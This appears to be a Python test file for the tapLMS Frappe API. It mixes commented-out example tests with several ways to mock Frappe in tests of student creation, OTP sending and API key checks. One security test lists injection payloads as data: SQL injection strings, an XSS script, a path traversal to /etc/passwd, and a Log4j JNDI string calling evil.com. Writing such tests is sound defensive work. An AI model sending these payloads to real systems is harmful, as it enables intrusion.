# """
# Improved test examples for tapLMS API
# These examples show how to enhance your current test structure
# """

# import unittest
# from unittest.mock import Mock, patch, MagicMock
# import pytest
# import json
# from datetime import datetime, timedelta
# import sys

# # Your existing mock setup (simplified)
# class MockFrappe:
#     def __init__(self):
#         self.response = Mock()
#         self.response.http_status_code = 200
#         self.local = Mock()
#         self.local.form_dict = {}
#         self.db = Mock()
#         self.utils = Mock()
#         self.request = Mock()
        
#     # ... rest of your mock setup

# mock_frappe = MockFrappe()
# sys.modules['frappe'] = mock_frappe

# # Import your API after setting up mocks
# from tap_lms.api import create_student, authenticate_api_key, send_otp

# # =============================================================================
# # IMPROVED TEST EXAMPLES
# # =============================================================================

# class TestStudentCreationComprehensive(unittest.TestCase):
#     """Comprehensive tests for student creation - improved version"""
    
#     def setUp(self):
#         """Set up test fixtures with realistic data"""
#         self.valid_student_data = {
#             'api_key': 'valid_test_key',
#             'student_name': 'John Doe',
#             'phone': '9876543210',
#             'gender': 'Male',
#             'grade': '5',
#             'language': 'English',
#             'batch_skeyword': 'test_batch_2025',
#             'vertical': 'Mathematics',
#             'glific_id': 'glific_12345'
#         }
        
#         # Reset form_dict for each test
#         mock_frappe.local.form_dict = self.valid_student_data.copy()
#         mock_frappe.response.http_status_code = 200

#     @patch('tap_lms.api.authenticate_api_key')
#     @patch('tap_lms.api.get_course_level_with_mapping')
#     @patch.object(mock_frappe, 'get_all')
#     @patch.object(mock_frappe, 'get_doc')
#     def test_create_student_success_flow(self, mock_get_doc, mock_get_all, 
#                                        mock_course_level, mock_auth):
#         """Test successful student creation with all dependencies"""
#         # Setup mocks
#         mock_auth.return_value = "valid_key"
        
#         # Mock batch onboarding data
#         mock_get_all.side_effect = [
#             # First call: batch onboarding
#             [{
#                 'school': 'SCHOOL_001',
#                 'batch': 'BATCH_001',
#                 'kit_less': 1
#             }],
#             # Second call: course vertical
#             [{'name': 'VERTICAL_001'}],
#             # Third call: existing student check
#             []  # No existing student
#         ]
        
#         # Mock batch document
#         mock_batch = Mock()
#         mock_batch.active = True
#         mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
        
#         # Mock student document
#         mock_student = Mock()
#         mock_student.name = 'STUDENT_001'
#         mock_student.append = Mock()
#         mock_student.save = Mock()
        
#         mock_get_doc.side_effect = [mock_batch, mock_student]
#         mock_course_level.return_value = 'COURSE_LEVEL_001'
        
#         # Execute test
#         result = create_student()
        
#         # Assertions
#         self.assertEqual(result['status'], 'success')
#         self.assertEqual(result['crm_student_id'], 'STUDENT_001')
#         self.assertEqual(result['assigned_course_level'], 'COURSE_LEVEL_001')
        
#         # Verify enrollment was added
#         mock_student.append.assert_called_once()
#         mock_student.save.assert_called_once()

#     @pytest.mark.parametrize("missing_field", [
#         'student_name', 'phone', 'gender', 'grade', 
#         'language', 'batch_skeyword', 'vertical', 'glific_id'
#     ])
#     def test_create_student_missing_required_fields(self, missing_field):
#         """Test student creation with each required field missing"""
#         # Remove one required field
#         test_data = self.valid_student_data.copy()
#         del test_data[missing_field]
#         mock_frappe.local.form_dict = test_data
        
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
#             result = create_student()
            
#             self.assertEqual(result['status'], 'error')
#             self.assertIn('required', result['message'].lower())

#     @pytest.mark.parametrize("invalid_phone", [
#         "123",           # Too short
#         "abcdefghij",    # Non-numeric
#         "",              # Empty
#         "1" * 20,        # Too long
#         "+91-abc-def",   # Mixed invalid format
#     ])
#     def test_create_student_invalid_phone_formats(self, invalid_phone):
#         """Test student creation with various invalid phone formats"""
#         test_data = self.valid_student_data.copy()
#         test_data['phone'] = invalid_phone
#         mock_frappe.local.form_dict = test_data
        
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
#             result = create_student()
            
#             # Should either validate and reject, or handle gracefully
#             # This depends on your validation logic
#             self.assertIn(result['status'], ['error', 'success'])

#     def test_create_student_expired_batch(self):
#         """Test student creation for expired batch"""
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
#              patch.object(mock_frappe, 'get_all') as mock_get_all, \
#              patch.object(mock_frappe, 'get_doc') as mock_get_doc:
            
#             # Mock expired batch
#             mock_get_all.return_value = [{
#                 'school': 'SCHOOL_001',
#                 'batch': 'BATCH_001',
#                 'kit_less': 1
#             }]
            
#             mock_batch = Mock()
#             mock_batch.active = True
#             mock_batch.regist_end_date = (datetime.now() - timedelta(days=1)).date()
#             mock_get_doc.return_value = mock_batch
            
#             result = create_student()
            
#             self.assertEqual(result['status'], 'error')
#             self.assertIn('ended', result['message'])

#     def test_create_student_database_error_rollback(self):
#         """Test database rollback on student creation error"""
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
#              patch.object(mock_frappe, 'get_all') as mock_get_all, \
#              patch.object(mock_frappe, 'get_doc') as mock_get_doc, \
#              patch.object(mock_frappe.db, 'rollback') as mock_rollback:
            
#             # Setup mocks for successful validation but database error
#             mock_get_all.side_effect = [
#                 [{'school': 'SCHOOL_001', 'batch': 'BATCH_001', 'kit_less': 1}],
#                 [{'name': 'VERTICAL_001'}],
#                 []  # No existing student
#             ]
            
#             mock_batch = Mock()
#             mock_batch.active = True
#             mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
            
#             mock_student = Mock()
#             mock_student.save.side_effect = Exception("Database error")
            
#             mock_get_doc.side_effect = [mock_batch, mock_student]
            
#             result = create_student()
            
#             # Should handle error and rollback
#             self.assertEqual(result['status'], 'error')
#             # Verify rollback was called (depends on your error handling)


# class TestOTPWorkflowComprehensive(unittest.TestCase):
#     """Comprehensive OTP workflow tests"""
    
#     def setUp(self):
#         mock_frappe.request.get_json.return_value = {
#             'api_key': 'valid_key',
#             'phone': '9876543210'
#         }

#     @patch('tap_lms.api.authenticate_api_key')
#     @patch('requests.get')
#     @patch.object(mock_frappe, 'get_all')
#     @patch.object(mock_frappe, 'get_doc')
#     def test_send_otp_complete_workflow(self, mock_get_doc, mock_get_all, 
#                                       mock_requests, mock_auth):
#         """Test complete OTP sending workflow"""
#         # Setup mocks
#         mock_auth.return_value = "valid_key"
#         mock_get_all.return_value = []  # No existing teacher
        
#         # Mock OTP document creation
#         mock_otp_doc = Mock()
#         mock_otp_doc.insert = Mock()
#         mock_get_doc.return_value = mock_otp_doc
        
#         # Mock WhatsApp API response
#         mock_response = Mock()
#         mock_response.json.return_value = {
#             "status": "success",
#             "id": "msg_12345"
#         }
#         mock_requests.return_value = mock_response
        
#         result = send_otp()
        
#         # Assertions
#         self.assertEqual(result['status'], 'success')
#         self.assertIn('whatsapp_message_id', result)
#         mock_otp_doc.insert.assert_called_once()

#     @patch('tap_lms.api.authenticate_api_key')
#     @patch('requests.get')
#     def test_send_otp_whatsapp_api_failure(self, mock_requests, mock_auth):
#         """Test OTP sending when WhatsApp API fails"""
#         mock_auth.return_value = "valid_key"
        
#         # Mock API failure
#         mock_response = Mock()
#         mock_response.json.return_value = {
#             "status": "error",
#             "message": "API rate limit exceeded"
#         }
#         mock_requests.return_value = mock_response
        
#         with patch.object(mock_frappe, 'get_all', return_value=[]), \
#              patch.object(mock_frappe, 'get_doc'):
            
#             result = send_otp()
            
#             self.assertEqual(result['status'], 'failure')
#             self.assertIn('WhatsApp', result['message'])

#     def test_send_otp_rate_limiting(self):
#         """Test OTP rate limiting (if implemented)"""
#         # This would test your rate limiting logic
#         # Multiple rapid requests should be rejected
#         pass


# class TestSecurityValidation(unittest.TestCase):
#     """Security-focused validation tests"""
    
#     @pytest.mark.parametrize("malicious_input", [
#         "'; DROP TABLE Student; --",
#         "1' OR '1'='1",
#         "<script>alert('xss')</script>",
#         "../../etc/passwd",
#         "{{7*7}}",  # Template injection
#         "${jndi:ldap://evil.com/a}",  # Log4j style
#     ])
#     def test_sql_injection_prevention(self, malicious_input):
#         """Test SQL injection prevention in various fields"""
#         test_data = {
#             'api_key': 'valid_key',
#             'student_name': malicious_input,  # Test malicious input
#             'phone': '9876543210',
#             'gender': 'Male',
#             'grade': '5',
#             'language': 'English',
#             'batch_skeyword': 'test_batch',
#             'vertical': 'Math',
#             'glific_id': 'glific_123'
#         }
        
#         mock_frappe.local.form_dict = test_data
        
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
#             # The function should either sanitize input or reject it
#             result = create_student()
            
#             # Should not cause SQL injection
#             # This assertion depends on your input validation
#             self.assertIn(result['status'], ['error', 'success'])
            
#             # If successful, verify data was sanitized
#             if result['status'] == 'success':
#                 # Check that malicious input was properly handled
#                 pass

#     def test_api_key_timing_attack_prevention(self):
#         """Test that API key validation doesn't leak timing information"""
#         import time
        
#         # Test with valid and invalid keys
#         start_time = time.time()
#         authenticate_api_key("valid_key_12345")
#         valid_time = time.time() - start_time
        
#         start_time = time.time()
#         authenticate_api_key("invalid_key_12345")
#         invalid_time = time.time() - start_time
        
#         # Times should be similar (within reasonable bounds)
#         # This prevents timing attacks
#         time_diff = abs(valid_time - invalid_time)
#         self.assertLess(time_diff, 0.1)  # Less than 100ms difference


# class TestPerformance(unittest.TestCase):
#     """Performance tests for critical operations"""
    
#     def test_bulk_student_creation_performance(self):
#         """Test performance with bulk student creation"""
#         import time
        
#         # Create 100 students and measure time
#         start_time = time.time()
        
#         for i in range(100):
#             test_data = {
#                 'api_key': 'valid_key',
#                 'student_name': f'Student {i}',
#                 'phone': f'987654{i:04d}',
#                 'gender': 'Male',
#                 'grade': '5',
#                 'language': 'English',
#                 'batch_skeyword': 'test_batch',
#                 'vertical': 'Math',
#                 'glific_id': f'glific_{i}'
#             }
            
#             mock_frappe.local.form_dict = test_data
            
#             with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
#                 # Mock all dependencies for speed
#                 with patch.object(mock_frappe, 'get_all'), \
#                      patch.object(mock_frappe, 'get_doc'):
#                     result = create_student()
        
#         end_time = time.time()
#         total_time = end_time - start_time
        
#         # Should complete 100 operations in reasonable time
#         self.assertLess(total_time, 10.0)  # Less than 10 seconds
        
#         avg_time_per_operation = total_time / 100
#         self.assertLess(avg_time_per_operation, 0.1)  # Less than 100ms per operation


# # =============================================================================
# # PYTEST FIXTURES FOR BETTER TEST ORGANIZATION
# # =============================================================================

# @pytest.fixture
# def valid_student_data():
#     """Fixture providing valid student data"""
#     return {
#         'api_key': 'valid_test_key',
#         'student_name': 'John Doe',
#         'phone': '9876543210',
#         'gender': 'Male',
#         'grade': '5',
#         'language': 'English',
#         'batch_skeyword': 'test_batch_2025',
#         'vertical': 'Mathematics',
#         'glific_id': 'glific_12345'
#     }

# @pytest.fixture
# def mock_active_batch():
#     """Fixture providing mock active batch"""
#     batch = Mock()
#     batch.active = True
#     batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
#     return batch

# @pytest.fixture
# def mock_expired_batch():
#     """Fixture providing mock expired batch"""
#     batch = Mock()
#     batch.active = True
#     batch.regist_end_date = (datetime.now() - timedelta(days=1)).date()
#     return batch


# # =============================================================================
# # INTEGRATION TEST EXAMPLE
# # =============================================================================

# class TestStudentCreationIntegration(unittest.TestCase):
#     """Integration tests that test multiple components together"""
    
#     def test_complete_student_onboarding_workflow(self):
#         """Test complete workflow from OTP to student creation"""
#         # This would test the entire flow:
#         # 1. Send OTP
#         # 2. Verify OTP
#         # 3. Create student
#         # 4. Assign to batch
#         # 5. Integrate with Glific
        
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
#              patch('requests.get') as mock_whatsapp, \
#              patch('tap_lms.glific_integration.create_contact') as mock_glific:
            
#             # Mock external service responses
#             mock_whatsapp.return_value.json.return_value = {
#                 "status": "success", "id": "msg_123"
#             }
#             mock_glific.return_value = {'id': 'contact_123'}
            
#             # Step 1: Send OTP
#             mock_frappe.request.get_json.return_value = {
#                 'api_key': 'valid_key',
#                 'phone': '9876543210'
#             }
            
#             otp_result = send_otp()
#             self.assertEqual(otp_result['status'], 'success')
            
#             # Step 2: Create student (after OTP verification)
#             student_data = {
#                 'api_key': 'valid_key',
#                 'student_name': 'John Doe',
#                 'phone': '9876543210',
#                 'gender': 'Male',
#                 'grade': '5',
#                 'language': 'English',
#                 'batch_skeyword': 'test_batch',
#                 'vertical': 'Math',
#                 'glific_id': 'glific_123'
#             }
#             mock_frappe.local.form_dict = student_data
            
#             with patch.object(mock_frappe, 'get_all'), \
#                  patch.object(mock_frappe, 'get_doc'):
#                 student_result = create_student()
                
#                 self.assertEqual(student_result['status'], 'success')
                
#                 # Verify external integrations were called
#                 mock_glific.assert_called()


# if __name__ == '__main__':
#     # Run tests with pytest for better output
#     pytest.main([__file__, '-v', '--tb=short'])
"""
Solutions for fixing Frappe import issues in tests
"""

# =============================================================================
# SOLUTION 1: PROPER FRAPPE TEST SETUP (RECOMMENDED)
# =============================================================================

"""
For Frappe apps, use the built-in testing framework.
Create this file: tap_lms/tests/test_api.py
"""

import frappe
import unittest
import json
from datetime import datetime, timedelta
from unittest.mock import patch, Mock

class TestTapLMSAPI(unittest.TestCase):
    """Test tap_lms API using Frappe's testing framework"""
    
    def setUp(self):
        """Set up test data using Frappe's test framework"""
        frappe.set_user("Administrator")
        
        # Create test API key
        if not frappe.db.exists("API Key", "test_api_key"):
            api_key = frappe.get_doc({
                "doctype": "API Key",
                "key": "test_api_key_12345",
                "enabled": 1
            })
            api_key.insert(ignore_permissions=True)
        
        # Create test school
        if not frappe.db.exists("School", "TEST_SCHOOL_001"):
            school = frappe.get_doc({
                "doctype": "School",
                "name": "TEST_SCHOOL_001",
                "name1": "Test School",
                "keyword": "test_school"
            })
            school.insert(ignore_permissions=True)
    
    def tearDown(self):
        """Clean up test data"""
        frappe.db.rollback()
    
    def test_authenticate_api_key_valid(self):
        """Test API key authentication with valid key"""
        from tap_lms.api import authenticate_api_key
        
        result = authenticate_api_key("test_api_key_12345")
        self.assertIsNotNone(result)
    
    def test_authenticate_api_key_invalid(self):
        """Test API key authentication with invalid key"""
        from tap_lms.api import authenticate_api_key
        
        result = authenticate_api_key("invalid_key")
        self.assertIsNone(result)
    
    @patch('tap_lms.glific_integration.create_contact')
    @patch('requests.post')
    def test_create_student_success(self, mock_whatsapp, mock_glific):
        """Test successful student creation"""
        from tap_lms.api import create_student
        
        # Setup mocks
        mock_glific.return_value = {'id': 'contact_123'}
        mock_whatsapp.return_value.status_code = 200
        
        # Create required test data
        self._create_test_batch_onboarding()
        
        # Set form data
        frappe.local.form_dict = {
            'api_key': 'test_api_key_12345',
            'student_name': 'John Doe',
            'phone': '9876543210',
            'gender': 'Male',
            'grade': '5',
            'language': 'English',
            'batch_skeyword': 'test_batch_2025',
            'vertical': 'Mathematics',
            'glific_id': 'glific_12345'
        }
        
        result = create_student()
        
        self.assertEqual(result['status'], 'success')
        self.assertIn('crm_student_id', result)
    
    def _create_test_batch_onboarding(self):
        """Helper to create test batch onboarding data"""
        # Create test course vertical
        if not frappe.db.exists("Course Verticals", "TEST_VERTICAL"):
            vertical = frappe.get_doc({
                "doctype": "Course Verticals",
                "name": "TEST_VERTICAL",
                "name2": "Mathematics"
            })
            vertical.insert(ignore_permissions=True)
        
        # Create test batch
        if not frappe.db.exists("Batch", "TEST_BATCH_001"):
            batch = frappe.get_doc({
                "doctype": "Batch",
                "name": "TEST_BATCH_001",
                "batch_id": "test_batch_2025",
                "active": 1,
                "start_date": frappe.utils.today(),
                "end_date": frappe.utils.add_days(frappe.utils.today(), 365),
                "regist_end_date": frappe.utils.add_days(frappe.utils.today(), 30)
            })
            batch.insert(ignore_permissions=True)
        
        # Create batch onboarding
        if not frappe.db.exists("Batch onboarding", {"batch_skeyword": "test_batch_2025"}):
            onboarding = frappe.get_doc({
                "doctype": "Batch onboarding",
                "school": "TEST_SCHOOL_001",
                "batch": "TEST_BATCH_001",
                "batch_skeyword": "test_batch_2025",
                "kit_less": 1,
                "from_grade": "1",
                "to_grade": "10"
            })
            onboarding.append("batch_school_verticals", {
                "course_vertical": "TEST_VERTICAL"
            })
            onboarding.insert(ignore_permissions=True)


# =============================================================================
# SOLUTION 2: MOCK BEFORE IMPORT (Alternative)
# =============================================================================

"""
If you want to keep your current mock approach, do this:
Create a separate file: tap_lms/tests/test_api_isolated.py
"""

import sys
import unittest
from unittest.mock import Mock, patch, MagicMock
import json
from datetime import datetime, timedelta

# =============================================================================
# MOCK FRAPPE COMPLETELY BEFORE ANY IMPORTS
# =============================================================================

class MockFrappeUtils:
    """Mock frappe.utils module"""
    @staticmethod
    def cint(value):
        try:
            return int(value)
        except:
            return 0
    
    @staticmethod
    def today():
        return datetime.now().date().strftime('%Y-%m-%d')
    
    @staticmethod
    def get_url():
        return "http://localhost:8000"
    
    @staticmethod
    def now_datetime():
        return datetime.now()
    
    @staticmethod
    def getdate(date_str=None):
        if date_str:
            return datetime.strptime(str(date_str), '%Y-%m-%d').date()
        return datetime.now().date()
    
    @staticmethod
    def cstr(value):
        return str(value) if value is not None else ""
    
    @staticmethod
    def get_datetime(dt):
        if isinstance(dt, str):
            return datetime.strptime(dt, '%Y-%m-%d %H:%M:%S')
        return dt

class MockFrappe:
    """Complete mock of frappe module"""
    
    def __init__(self):
        self.utils = MockFrappeUtils()
        self.response = Mock()
        self.response.http_status_code = 200
        self.local = Mock()
        self.local.form_dict = {}
        self.db = Mock()
        self.db.commit = Mock()
        self.db.rollback = Mock() 
        self.db.sql = Mock(return_value=[])
        self.db.get_value = Mock(return_value="test_value")
        self.request = Mock()
        self.request.get_json = Mock(return_value={})
        self.request.data = '{}'
        self.flags = Mock()
        self.flags.ignore_permissions = False
        self.logger = Mock()
        
    def get_doc(self, *args, **kwargs):
        doc = Mock()
        doc.name = "TEST_DOC"
        doc.insert = Mock()
        doc.save = Mock()
        doc.append = Mock()
        return doc
    
    def new_doc(self, doctype):
        doc = Mock()
        doc.name = f"NEW_{doctype}"
        doc.insert = Mock()
        doc.save = Mock()
        doc.append = Mock()
        return doc
    
    def get_all(self, *args, **kwargs):
        return []
    
    def get_single(self, doctype):
        return Mock()
    
    def get_value(self, *args, **kwargs):
        return "test_value"
    
    def throw(self, message):
        raise Exception(message)
    
    def log_error(self, message, title=None):
        pass
    
    def whitelist(self, allow_guest=False):
        def decorator(func):
            return func
        return decorator
    
    # Exception classes
    class DoesNotExistError(Exception):
        pass
    
    class ValidationError(Exception):
        pass
    
    class DuplicateEntryError(Exception):
        pass

# Create and inject mock BEFORE any imports
mock_frappe = MockFrappe()
sys.modules['frappe'] = mock_frappe
sys.modules['frappe.utils'] = mock_frappe.utils

# Mock external modules too
sys.modules['tap_lms.glific_integration'] = Mock()
sys.modules['tap_lms.background_jobs'] = Mock()

# NOW it's safe to import
from tap_lms.api import authenticate_api_key, create_student, send_otp

class TestTapLMSAPIIsolated(unittest.TestCase):
    """Isolated tests using complete mocking"""
    
    def setUp(self):
        # Reset mocks for each test
        mock_frappe.response.http_status_code = 200
        mock_frappe.local.form_dict = {}
    
    def test_authenticate_api_key_valid(self):
        """Test authenticate_api_key with valid key"""
        with patch.object(mock_frappe, 'get_doc') as mock_get_doc:
            mock_doc = Mock()
            mock_doc.name = "valid_key"
            mock_get_doc.return_value = mock_doc
            
            result = authenticate_api_key("valid_api_key")
            self.assertEqual(result, "valid_key")
    
    def test_authenticate_api_key_invalid(self):
        """Test authenticate_api_key with invalid key"""
        with patch.object(mock_frappe, 'get_doc') as mock_get_doc:
            mock_get_doc.side_effect = mock_frappe.DoesNotExistError("Not found")
            
            result = authenticate_api_key("invalid_key")
            self.assertIsNone(result)
    
    def test_create_student_success(self):
        """Test successful student creation"""
        # Setup test data
        mock_frappe.local.form_dict = {
            'api_key': 'valid_key',
            'student_name': 'John Doe',
            'phone': '9876543210',
            'gender': 'Male',
            'grade': '5',
            'language': 'English',
            'batch_skeyword': 'test_batch',
            'vertical': 'Math',
            'glific_id': 'glific_123'
        }
        
        with patch.object(mock_frappe, 'get_all') as mock_get_all, \
             patch.object(mock_frappe, 'get_doc') as mock_get_doc, \
             patch('tap_lms.api.get_course_level_with_mapping') as mock_course:
            
            # Mock all the required database calls
            mock_get_all.side_effect = [
                # Batch onboarding
                [{'school': 'SCHOOL_001', 'batch': 'BATCH_001', 'kit_less': 1}],
                # Course vertical  
                [{'name': 'VERTICAL_001'}],
                # Existing student check
                []
            ]
            
            # Mock batch document
            mock_batch = Mock()
            mock_batch.active = True
            mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
            
            # Mock student document
            mock_student = Mock()
            mock_student.name = 'STUDENT_001'
            mock_student.append = Mock()
            mock_student.save = Mock()
            
            mock_get_doc.side_effect = [mock_batch, mock_student]
            mock_course.return_value = 'COURSE_001'
            
            result = create_student()
            
            self.assertEqual(result['status'], 'success')
            self.assertEqual(result['crm_student_id'], 'STUDENT_001')


# =============================================================================
# SOLUTION 3: PYTEST WITH PROPER SETUP (Most Flexible)
# =============================================================================

"""
Create: tap_lms/tests/conftest.py
"""

import pytest
import sys
from unittest.mock import Mock, patch

@pytest.fixture(scope="session", autouse=True)
def setup_frappe_mocks():
    """Setup frappe mocks before any tests run"""
    
    # Mock frappe.utils first
    mock_utils = Mock()
    mock_utils.cint = lambda x: int(x) if x else 0
    mock_utils.today = lambda: "2025-01-15"
    mock_utils.now_datetime = lambda: __import__('datetime').datetime.now()
    mock_utils.getdate = lambda x=None: __import__('datetime').datetime.now().date()
    mock_utils.cstr = lambda x: str(x) if x is not None else ""
    mock_utils.get_datetime = lambda x: x
    
    # Mock main frappe module
    mock_frappe = Mock()
    mock_frappe.utils = mock_utils
    mock_frappe.response = Mock()
    mock_frappe.response.http_status_code = 200
    mock_frappe.local = Mock()
    mock_frappe.local.form_dict = {}
    mock_frappe.db = Mock()
    mock_frappe.request = Mock()
    mock_frappe.flags = Mock()
    
    # Exception classes
    mock_frappe.DoesNotExistError = type('DoesNotExistError', (Exception,), {})
    mock_frappe.ValidationError = type('ValidationError', (Exception,), {})
    
    # Inject mocks
    sys.modules['frappe'] = mock_frappe
    sys.modules['frappe.utils'] = mock_utils
    sys.modules['tap_lms.glific_integration'] = Mock()
    sys.modules['tap_lms.background_jobs'] = Mock()
    
    return mock_frappe

"""
Create: tap_lms/tests/test_api_pytest.py
"""

import pytest
from unittest.mock import Mock, patch
import json
from datetime import datetime, timedelta

# Import after mocks are set up
from tap_lms.api import authenticate_api_key, create_student

class TestTapLMSAPIPytest:
    """Pytest-based tests for tap_lms API"""
    
    def test_authenticate_api_key_valid(self, setup_frappe_mocks):
        """Test authenticate_api_key with valid key"""
        mock_frappe = setup_frappe_mocks
        
        with patch.object(mock_frappe, 'get_doc') as mock_get_doc:
            mock_doc = Mock()
            mock_doc.name = "valid_key"
            mock_get_doc.return_value = mock_doc
            
            result = authenticate_api_key("valid_api_key")
            assert result == "valid_key"
    
    def test_authenticate_api_key_invalid(self, setup_frappe_mocks):
        """Test authenticate_api_key with invalid key"""
        mock_frappe = setup_frappe_mocks
        
        with patch.object(mock_frappe, 'get_doc') as mock_get_doc:
            mock_get_doc.side_effect = mock_frappe.DoesNotExistError("Not found")
            
            result = authenticate_api_key("invalid_key")
            assert result is None
    
    @pytest.mark.parametrize("missing_field", [
        'student_name', 'phone', 'gender', 'grade'
    ])
    def test_create_student_missing_fields(self, setup_frappe_mocks, missing_field):
        """Test create_student with missing required fields"""
        mock_frappe = setup_frappe_mocks
        
        # Setup base data
        test_data = {
            'api_key': 'valid_key',
            'student_name': 'John Doe',
            'phone': '9876543210',
            'gender': 'Male',
            'grade': '5',
            'language': 'English',
            'batch_skeyword': 'test_batch',
            'vertical': 'Math',
            'glific_id': 'glific_123'
        }
        
        # Remove the field being tested
        del test_data[missing_field]
        mock_frappe.local.form_dict = test_data
        
        with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
            result = create_student()
            assert result['status'] == 'error'
            assert 'required' in result['message'].lower()


# =============================================================================
# SOLUTION 4: FRAPPE BENCH SETUP (Production-like)
# =============================================================================

"""
If you're using frappe-bench, create this file:
tap_lms/tap_lms/tests/test_api.py (note the path difference)

And run tests with:
bench --site test_site run-tests --app tap_lms --module tap_lms.tests.test_api
"""

import frappe
import unittest

class TestTapLMSAPIBench(unittest.TestCase):
    
    def setUp(self):
        frappe.set_user("Administrator")
        # Create test fixtures
        
    def test_authenticate_api_key(self):
        from tap_lms.api import authenticate_api_key
        
        # Create test API key
        api_key_doc = frappe.get_doc({
            "doctype": "API Key",
            "key": "test_key_12345",
            "enabled": 1
        })
        api_key_doc.insert()
        frappe.db.commit()
        
        # Test the function
        result = authenticate_api_key("test_key_12345")
        self.assertIsNotNone(result)
        
        # Clean up
        api_key_doc.delete()
        frappe.db.commit()


if __name__ == '__main__':
    unittest.main()